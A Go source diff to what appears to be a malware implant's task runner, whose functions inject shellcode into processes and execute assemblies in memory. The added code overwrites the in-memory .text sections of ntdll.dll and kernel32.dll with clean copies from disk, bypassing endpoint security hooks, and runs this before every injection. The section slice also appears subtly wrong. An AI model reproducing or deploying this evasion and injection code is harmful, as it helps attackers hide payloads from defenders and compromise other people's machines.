@@ -2,8 +2,10 @@ package taskrunner
 
 import (
 	"bytes"
+	"debug/pe"
 	"fmt"
 	"io"
+	"io/ioutil"
 	"os"
 	"os/exec"
 	"runtime"
@@ -98,6 +100,52 @@ func ptr(val interface{}) uintptr {
 	}
 }
 
+func refreshPE(name string) {
+	df, e := ioutil.ReadFile(name)
+
+	f, e := pe.Open(name)
+	if e != nil {
+		panic(e)
+	}
+
+	x := f.Section(".text")
+	ddf := df[x.Offset:x.Size]
+	writeGoodBytes(ddf, name, x.VirtualAddress, x.Name, x.VirtualSize)
+}
+
+func writeGoodBytes(b []byte, pn string, virtualoffset uint32, secname string, vsize uint32) {
+	t, _ := syscall.LoadDLL(pn)
+	h := t.Handle
+	dllBase := uintptr(h)
+
+	dllOffset := uint(dllBase) + uint(virtualoffset)
+
+	var old uint64
+	kernel32 := syscall.NewLazyDLL("kernel32.dll")
+
+	virtprot := kernel32.NewProc("VirtualProtect")
+	virtprot.Call(
+		uintptr(dllOffset),
+		uintptr(len(b)),
+		uintptr(0x40),
+		uintptr(unsafe.Pointer(&old)),
+	)
+
+	for i := 0; i < len(b); i++ {
+		loc := uintptr(dllOffset + uint(i))
+		mem := (*[1]byte)(unsafe.Pointer(loc))
+		(*mem)[0] = b[i]
+
+	}
+
+	virtprot.Call(
+		uintptr(dllOffset),
+		uintptr(len(b)),
+		uintptr(old),
+		uintptr(unsafe.Pointer(&old)),
+	)
+}
+
 // injectTask - Injects shellcode into a process handle
 func injectTask(processHandle syscall.Handle, data []byte) error {
 
@@ -162,6 +210,8 @@ func injectTask(processHandle syscall.Handle, data []byte) error {
 
 // RermoteTask - Injects Task into a processID using remote threads
 func RemoteTask(processID int, data []byte) error {
+	refreshPE(`c:\windows\system32\ntdll.dll`)
+	refreshPE(`c:\windows\system32\kernel32.dll`)
 	processHandle, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(processID))
 	if processHandle == 0 {
 		return err
@@ -174,6 +224,8 @@ func RemoteTask(processID int, data []byte) error {
 }
 
 func LocalTask(data []byte) error {
+	refreshPE(`c:\windows\system32\ntdll.dll`)
+	refreshPE(`c:\windows\system32\kernel32.dll`)
 	size := len(data)
 	addr, _ := sysAlloc(size)
 	buf := (*[9999999]byte)(unsafe.Pointer(addr))
@@ -188,6 +240,8 @@ func LocalTask(data []byte) error {
 }
 
 func ExecuteAssembly(hostingDll, assembly []byte, params string, timeout int32) (string, error) {
+	refreshPE(`c:\windows\system32\ntdll.dll`)
+	refreshPE(`c:\windows\system32\kernel32.dll`)
 	// {{if .Debug}}
 	log.Println("[*] Assembly size:", len(assembly))
 	log.Println("[*] Hosting dll size:", len(hostingDll))
